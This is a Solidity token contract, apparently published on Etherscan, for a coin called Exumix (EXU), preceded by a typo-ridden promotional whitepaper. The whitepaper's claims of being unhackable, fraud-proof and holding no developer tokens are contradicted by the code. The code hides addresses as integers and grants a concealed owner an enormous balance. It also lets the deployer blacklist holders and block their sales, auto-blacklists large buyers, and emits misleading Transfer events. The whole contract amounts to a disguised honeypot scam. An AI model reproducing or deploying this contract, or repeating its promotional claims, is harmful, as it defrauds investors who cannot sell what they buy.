/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

/*

https://exumix.com/

DISCLAMER

Information presented to you through this whitepaper should not be treated as investment, tax, or legal advice under any circumstances.

This white paper gives a brief overview of thi key business components of the Exumix Ecosystem. Exumix incorporated some blocks of information in this whitepaper to equip you with key knowiedge related to a concept that may be of interest. The opinions and materials included in this whitepaper are not to be deemed a solicitation for the sale or purchase of any securities.

Exumix reserves all rights.


INTRODUCTION

Exumix means"vielding to prayer Exumix is a Dubai-based authentic digital decentralized crypto future. Exumix isa worldwide topmost decentralized cryptocurrency on Ethereum Smart Contract.

Today, distributed ledger technology is advancing at lightning speed and has applications in many fields, from finance andlaw to art, although only recently have blockchain-related projects been perceived by people as fraudulent.

Cryptocurrency, despite its volatility, has become one of the most promising objects of investment for companies and individuals. In our opinion, this rapid development of the blockchain world creates a large gap between the products of this technology and its applications.

It can be concluded that despite the intensive growthoftheblockchainsphere,thecryptocurrency remains more of a trading asset, than a means of payment, as conceived by Satoshi Nakamoto himself.

WHY DECENTRALIZED?

A decentralized application is an application that can operate autonomously, typically through the use of smart contracts, that runs on decentralized computing,and blockchain systems. Liketraditional applications, D-apps provide some function or utility to their users. EXU is coming up with D-app that offers decentralized services, where no third party is required.

EXUisaverified smart contract on Ethereum T that can be accessed from anywhere in the world. EXU team is specialized in creative passive income sources globally. This is a Decentralized Finance prolect set to have no limitations on earning and no controller to access the funds, so we have no control overyour money. We have created the smart contract in such a way that it functions autonomously using transaction cost as its fuel. It requires no extra inputs and its simple function is to calculate and distribute rewards.


WHY Exumix?

Fraud-proof

When cryptocurrency is created, all confirmed transactions are stored in a public ledger. All identities of coin owners are encrypted to ensure the legitimacy of record keeping. Because the currency is decentralized, you own it. Neither government nor the bank has any control over it.

Identity Theft

The ledger ensures that all transactions between "digital wallets" can calculate an accurate balance, All transactions are checked to make sure that the coins used are owned by the current spender. This public ledger is also referred to as a "transaction blockchain. Blockchain technology ensupes secure digital transactions through encryption and "smart contracts" that make the entity virtually unhackable and vold of fraud. With security like this, blockchain technology is poised to impact nearly every segment of our lives.

Instant Settlement

Blockchain is the reason why cryptocurrency has any value. Ease of use is the reason why the cryptocurrency is in high demand. All you need is a smart device and an internet connection and instantly you become your bank making payments and money transfers

Accessible

There are over two billion people with access to the Internet who don't have the right to use traditional exchange systems. These individuals are clued-in to the cryptocurrency market

You are the owner

There is no other electronic cash system in which your account is owned by you

EXU Cryptocurrency is an opportunity for crypto users to invest and get massive profitable retums. EXU Cryptocurrency will indulge the users in many upcoming projects


Exumix EXU

EXU Cryptocurrency is a decentralized Cryptothat is very safe and secure for the indiviual. Digital money data is safe with blockchain technology, where nobody can be involved or hacked.

The distribution of Tokenized Assets is in the Algorithm slab which will increase the value of the token.

Easy to connect through D-app, Easy to trade Cryptocurrency, Decentralized easy payment getaway along with best returns.

Coming up with exchanges to meet the user's satisfaction. Listing in the topmost exchanges platform and coming on the floor with its own exchange platform.

Exiting upcoming projects such as Token-based gaming platform, NFT marketplace, Multi-utility applications, OTT platform, and own Blockchain Technology which will Increase the value of assets.


TERMINOLOGY

.Smart Contract

Computerized transaction protocols that execute the terms of a contract

Web3 (also known as Web 3.0) is an idea for a new iteration of the World Wide Webwhich in corporates concepts such as decentralization, blockchain technologies, and token-based economics.

.Decentralized Application (DApps)

AWeb3 application that allows user-controlled data access and services.

.Liquidity Pools (LPs)

Smart Contracts containing ODL in the form of two currencies allow for swaps to take place.

.LP Tokens

LP tokens are keys minted by the protocol which can be used to unlock staked llquidity or yield farm.

.Staking 

Staking is the act of locking cryptocurrencies to receive rewards.


.AnnualPercentage Yield (APY)

The annual percentage yield (APY) is the real rate of returm earned on a savings deposit or investment taking into account the offect of compounding interest

.Annual Percentage Rate (APR)

The annual rate of interest charged to borrowers and paid to investors

.Hash Power

Hash power or hashing power is the power that i computer or mining hardware uses to run and solve different hashing aigorithms.

.Claim Token

Atolen that allows its holder to claim a utility token. The claim tolen in the Exumix ecogystem is EXU

.Pool Supply

The total amount of rewards left to be distributed to Stakers


OUR VALUES

-TRANSPARENCY

We are creating a community around openness, communication, and loyalty. You can count on EXU to deliver a permanently decentralized platform.

-INNOVATION

What else can we do to make EXU stronger and more useful? That is the question we are constantly asking, using our creative minds to keep the ecosystem evolving.

-COMMUNITY

We share a single vision to push forward, and make better provisions for the benefits.

-LOYALTY

EXU is operative when every single works on the same goal We stick together on the ride to success-It's the best way forward.

-SUSTAINABILITY

EXU is not alming to simply capture the latest market trends, but to act as a building block in the future to come

-TRUST

EXU is an ecosystem where you are in control. The developers do not own any tokens, and llquidity will be locked at launch-all intended to give you the peace of mind you need.


OUR VISION

Exumix is committed to solving inefficiencies by developing convenient and sustainable solutions. Our team ploneers a new digital financial system by harnessing the potential behind Blockchain. We see a future of the digital financial world where all assets are Tokenized onchain. This allows traders have efficient ways to transfer or manage their funds. We are looking ahead to be seamless, instant, and secure. Succinctly, we are making the financial services of the future. Rooted in transparency, inclusivity, and efficiency for making fully-automated products. We are doing extensive efforts to develop a truly global exchange that provides worldwide opportunities.

We want to create a financially secure future and fight against financial insecurity by deploying an independent contractor on an immutable system, We want to bring the world together without any currency barriers and borders. We also aim to create a system for passive income where no one is in control and the code does everything automatically on a platform that can not be hacked or changed



APROPOS Exumix

Exumix is also known as EXU cryptocurrency on  Ethereum Smart Contracts with a Network of ERC20. One of the top most Decentralized Assets with a Total Supply of 250 Million. Exumix rolease 125 Million in the Pre-Sale.

EXU Cryptocurrency is Acceptable in USDC/AUSDT with zero charges. invest using Trustwallet and Metamask or through Software.


TOKENIZED ASSETS

-Buy Assets

The Exumix tokon is usod to buy assots within the virtual world. Assets include- vehicles, buildings, houses, and others available in the Exumix market.

-OTT Platforms

An over-the-top media service is a media service offered directly to viewers via the Internet.

-Get AD Space

Exumix Tokens are used to buy advertising space. Anyone can endorse their business in the metaverse world via buying ad space.

-Decentralized Database

In video games of the future, in-game assets are kept as data entries in a decentralized ledger. the blockchain.

-Create NFTs

Exumix Token can be used to croate NFTS. Yet another way of earning additional income with crypto-based sources.

-Buy Fee

Exumix Token can be used to create NFTS. Yet another way of earning odditional income with crypto based sources.


STAKING

Exumix holders will stake their tokens on Ethereum. Holders can stake their Tokens for the desired period. They can lock their Tokens for a long-time as well. Tokens are weighted by the staking period. Every time, users will get automated buyback after purchasing the Token. Tokens are distributed among the total weighted staking tokens. The total counted staking pool is made up of all the staked tokens. It's calculated by the number of months the Token has been staked for.

Holders can stake it anytime, anywhere they want. They also can stake a small portion of their holdings for a long time. This will separate staking entries. Every entry would be independent. Holders can get multiple staking entries- each entry is customized with a specific amount to stake. The Tokens earned from staking can withdraw at any time.


TOKEN UTILITIES

Exumix- A Multi-Utility Token

Cryptocurrencies are known as storage of value. However, as the crypto world matures, utility tokens are emerging. It becomes more profitable beyond

economic profits. The Exumix token develops for use in all areas of life. Traders will benefit from every walk. Below are the main benefits that traders enjoy

• Multi-currency exchange
• A foundation
• Worldwide money transfers
• Digital wallet
• Use the Mobile Financial system for 
making faster payment


Exumix P2P TOKEN

Exumix offers a launchpad for elite players and holders. Traders can take advantage of several benefits if they are token holders. They have an opportunity to add promising cryptocurrencies to their portfolio. You can take advantage of the new multi-utility tokens to achieve excellent ROL. Token holders will be able to receive discounts on future NFT marketplaces

You will have access to additional rewards Alternatively, users can use Exumix to earn asset tokens. Exumix opens the door to the Play-to earn universe. This makes it easier to play titles and game-specific NFTS.


THE Exumix SMART WALLET

Smart contract wallets are wallets with unique abilities due to the power of smart contract functionality. They enable additional security and recovery features for users.

Using the Exumix wallet is the key to protecting payment transactions incryptocurrencies.Optimize your user experience by integrating your website with your game.

Each user account is automatically synced with your wallet address. For this reason, it is called a smart wallet Use multiple features to simplify the user experience.


THE Exumix MOBILE WALLET

The Exumix wallet can also be used as a mobile wallet. Implements the same functionality as a fast-crypto transaction. Over 70% of users want to continue trading on their smartphones. Our mobile wallet can be configured for instant transactions With a wallet, merchants only have to send coins over the phone. You can now use your smartphone as an authentication device for trading with Exumi.


THE Exumix D-APP

METAMASK

DApps offer excellent opportunities for Trading,Hodlingthecryptos.Itallowsexploringdecentralized finance, marketplaces, and games. You deserve easy access to the Exumix Tokan, MotaMask is your partner if you want to

Buy crypto in a few seconds 
Exchange cryptos
Track prices and charts
Keep your stakings safe from hackers 
See collectibles, ART & NFTs in one place

TRUSTWALLET

A quick crypto gateway to blockchain applications Now, you can explore cryptos in a few seconds. It allows you to buy, store, send & swap tolens in 1tap.

Exchange quickdy
Buy crypto with a card 
Secure trading window

TrustWallet lets the users manage their own identities. Moreover, it gets a safe interface to review the transactions before starting trading


LAUNCHPAD

The world of cryptocurrency is an everchanging place. Thousands of new coins are launched daily, with almost little to no technical skill required. Many of these coins are typically launched through what we call a decentralized exchange. Many of these exchanges, such as Uniswap and Pancakeswap.

On these exchanges, coins that are launched can generally be grouped into categories. Some of the more well-known categories would be DEFI, Metaverse, NFTS, Gambling, Storage, Staking Farming, & Meme coins. Launchpads would essentially be a category; however, it is more of anemerging space becoming more popular every day 

Exumix starter is a primary launchpad on Exumix. It supports many upcoming projects that wish to build on the Exumix network, We build a platform for the community, by the community, and for the new communities Exumix launchpad allows new starters to raise funds. In addition, we provide unique opportunities for beginning projects to partner with experts Projects that have already been published can participate in the launchpad.

Exumix comes with a launchpad, and the crowdfunding platform offers financial institutions great investment opportunities. With the designed NFT usability, EXU users will be able to benefit from:


Genuine Data Ownership

Users who generated digital content are real owners of their creations regardless of time, place, and network environment. With blockchain, every digital content can be tokenized, providing users options to decide how to trade, and sell, or asset their creations.

Security and Immutability

Digital contents can be simply tokenized and traded in markets that are powered by blockchain technology. Digital contents with scarcity are always fragile to fraud and theft, but blockchain technology minimizes these risks and secures their originality

. Market Valuation

Non-Fungible Tokens generated on the blockchain can be traded among users on the supportive marketplaces. By trading digital content as NFTS they can expose their digital creations inthemarket which will evaluate them. This procedure can add extra value to digital content and its creators

Interoperability

Blockchain allows digital content and digital assets to be shared with other platforms to create a meta universe. NFTS and any other metaverse assets can be used cross-platform in various platforms that afford it. From the interoperable circulation, a metaverse economy is enlarged and arranged.

*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Exumix  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}